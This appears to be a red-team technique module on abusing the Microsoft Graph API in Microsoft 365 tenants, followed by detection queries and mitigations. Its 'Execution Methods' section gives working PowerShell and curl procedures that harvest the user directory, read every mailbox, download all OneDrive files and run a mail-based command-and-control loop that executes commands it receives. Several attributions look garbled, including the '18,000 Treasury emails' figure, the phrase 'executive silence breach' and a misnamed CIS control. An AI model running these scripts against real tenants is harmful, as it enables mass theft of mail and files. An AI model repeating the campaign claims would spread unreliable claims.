# REC-M365-001: Microsoft Graph API Enumeration

## 1. MODULE METADATA

| Field | Value |
|-------|-------|
| **Module ID** | REC-M365-001 |
| **Technique Name** | Microsoft Graph API enumeration |
| **MITRE ATT&CK ID** | T1087.004 – Account Discovery: Cloud Account; T1530 – Data from Cloud Storage |
| **CVE** | N/A (API misuse; design feature) |
| **Platform** | Microsoft 365 / Office 365 / Entra ID |
| **Viability Status** | ACTIVE ✓ |
| **Difficulty to Detect** | MEDIUM (logging not default; distinctive patterns detectable) |
| **Requires Authentication** | Yes (delegated or app-only permissions) |
| **Applicable Versions** | All M365 tenants |
| **Last Verified** | December 2025 |
| **Author** | SERVTEP (Pchelnikau Artur) |

---

## 2. EXECUTIVE SUMMARY

Microsoft Graph API enumeration enables attackers to systematically extract organizational data across M365 services—Entra ID user directories, Exchange mailboxes, SharePoint sites, OneDrive folders, Teams conversations—leveraging either stolen user credentials (delegated permissions) or compromised service principals (app-only permissions). Real-world APT campaigns including SolarWinds SUNBURST and APT29 have weaponized Graph API for silent data exfiltration, leaving minimal forensic evidence while accessing sensitive executive communications.

**Strategic Capabilities:**
- Complete user enumeration (displayName, mail, job title, manager relationships)
- Mailbox access (read, send, delete emails across organization)
- OneDrive/SharePoint enumeration (access all documents)
- Teams data extraction (conversations, files, teams composition)
- Entra ID role discovery (identify admins, privileged users)
- Calendar enumeration (executive schedules, meeting details)
- Contact extraction (organizational relationships)

**Real-World Attribution:** SolarWinds (18,000 Treasury emails), APT29 (executive silence breach), GoGra (email C2), CMD365 (persistence), Void Blizzard (reconnaissance)

---

## 3. EXECUTION METHODS

### Method 1: User/Group Enumeration via Graph Explorer

```
# Step 1: Open Graph Explorer
https://developer.microsoft.com/en-us/graph/graph-explorer

# Step 2: Query all users
GET /users?$top=999&$select=displayName,mail,jobTitle,manager

# Output: All organizational users
# Data exposed: Job titles identify admins, managers show reporting structure

# Step 3: Enumerate all groups
GET /groups?$top=999&$filter=mailEnabled eq true

# Step 4: Get group members (identify privileged groups)
GET /groups/{group-id}/members

# Step 5: Query directory roles
GET /directoryRoles?$expand=members

# Result: Complete organizational hierarchy and privilege mapping
```

### Method 2: Email Exfiltration via Mail.Read Permission

```powershell
# Authenticate as app with Mail.Read.All
$token = Get-MgAccessToken

# Enumerate all mailboxes accessible
$mailboxes = Get-MgUser -All

foreach ($mailbox in $mailboxes) {
  # Read all emails from target user
  $emails = Get-MgUserMessage -UserId $mailbox.Id -All
  
  foreach ($email in $emails) {
    Write-Host "From: $($email.From.EmailAddress.Address)"
    Write-Host "Subject: $($email.Subject)"
    Write-Host "Body: $($email.BodyPreview)"
    Write-Host "---"
  }
}

# Result: Access to all corporate emails
# SolarWinds impact: 18,000 US Treasury emails exfiltrated
```

### Method 3: OneDrive/SharePoint Files Access

```powershell
# List all SharePoint sites
Get-MgSite -All | Select-Object DisplayName, WebUrl

# Enumerate drive items across organization
foreach ($user in (Get-MgUser -All)) {
  $drive = Get-MgUserDrive -UserId $user.Id
  $items = Get-MgDriveItem -DriveId $drive.Id -All
  
  foreach ($item in $items) {
    if ($item.File) {
      Write-Host "$($user.DisplayName): $($item.Name)"
      # Download sensitive files
      Get-MgDriveItemContent -DriveId $drive.Id -DriveItemId $item.Id -OutFile "./$($item.Name)"
    }
  }
}

# Result: All OneDrive/SharePoint documents accessible
# Common targets: financial reports, source code, credentials
```

### Method 4: Malware Command & Control via Mail API (GoGra Pattern)

```powershell
# Malware embedded in application
# Uses Graph API as C2 channel

# Step 1: Authenticate (hardcoded credentials)
$cred = New-Object PSCredential("attacker@org.com", (ConvertTo-SecureString "password" -AsPlainText -Force))
Connect-MgGraph -Credential $cred

# Step 2: Poll inbox for commands
$commands = Get-MgUserMessage -UserId "attacker@org.com" -Filter "subject eq 'Input'"

foreach ($cmd in $commands) {
  # Extract command from email body
  $command = $cmd.Body.Content  # AES-256 encrypted
  $decrypted = Decrypt-AES -Data $command -Key $encryptionKey
  
  # Execute command
  $output = Invoke-Expression $decrypted
  
  # Send output back via email
  $params = @{
    Attachments = @($output)
    Subject = "Output"
    ToRecipients = @{EmailAddress = @{Address = "attacker@org.com"}}
  }
  Send-MgUserMessage -UserId "attacker@org.com" -BodyParameter $params
}

# Result: Persistent C2 over legitimate email channel
# No firewall blocks email; blends with normal traffic
# APT-grade evasion pattern
```

### Method 5: Unauthenticated Token Exposure

```bash
# Vulnerability: Exposed JavaScript file containing API endpoint
# Endpoint: /api/auth/graphtoken (unauthenticated)

# Step 1: Request elevated token
curl -X GET "https://target.com/api/auth/graphtoken"

# Response: Access token with User.Read.All, AccessReview.Read.All

# Step 2: Use token to enumerate users
curl -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/users?$select=displayName,mail"

# Result: 50,000+ user profiles exposed (real-world case)
# Impact: Executive information, phishing targeting, privilege escalation
```

---

## 4. DETECTION & RESPONSE

### Detection Rule: Reconnaissance Pattern

```kusto
MicrosoftGraphActivityLogs
| where TimeGenerated > ago(1h)
| where RequestUri has_any("/users", "/groups", "/directoryRoles", "/members")
| summarize APICount = count(), UniqueEndpoints = dcount(RequestUri)
  by AppId, UserId, bin(TimeGenerated, 5m)
| where APICount > 50  // Bulk enumeration
| extend AlertSeverity = "High"
```

### Detection Rule: Mail Exfiltration

```kusto
MicrosoftGraphActivityLogs
| where RequestUri contains "/messages"
| where RequestUri has "/users/" and RequestUri !contains "me/"
| summarize MailboxCount = dcount(RequestUri), RequestCount = count()
  by AppId, UserId, bin(TimeGenerated, 1h)
| where MailboxCount > 10  // Accessing multiple mailboxes
| extend AlertSeverity = "High", Pattern = "Potential email exfiltration"
```

---

## 5. MITIGATIONS

**Priority 1: CRITICAL**
- Enable MicrosoftGraphActivityLogs (export to Log Analytics)
- Audit all app registrations with Mail.Read/Files.Read permissions
- Remove unnecessary high-risk permissions (Mail.ReadWrite, Directory.ReadWrite.All)
- Require admin consent for delegated Graph permissions

**Priority 2: HIGH**
- Implement Conditional Access policies restricting Graph access from external networks
- Monitor for bulk user enumeration queries (>50 API calls/5 min)
- Establish baseline of approved application IDs
- Alert on unknown AppIDs accessing email or files
- Require MFA for apps accessing sensitive data

---

## 6. REAL-WORLD CAMPAIGNS

| Campaign | Year | Method | Impact |
|----------|------|--------|--------|
| **SolarWinds SUNBURST** | 2020 | Mail.Read API | 18,000+ Treasury emails |
| **APT29** | 2020-2025 | Delegated permissions | Executive mailbox access |
| **GoGra Malware** | 2024+ | Mail C2 via Graph | Persistent command execution |
| **Void Blizzard** | 2025 | User enumeration | Targeted phishing campaigns |

---

## 7. COMPLIANCE & REFERENCES

- MITRE T1087.004 (Account Discovery: Cloud Account)
- MITRE T1530 (Data from Cloud Storage)
- CIS Controls v8: 6.2 (Account Discovery Prevention)
- NIST 800-53: AC-2 (Account Management)

---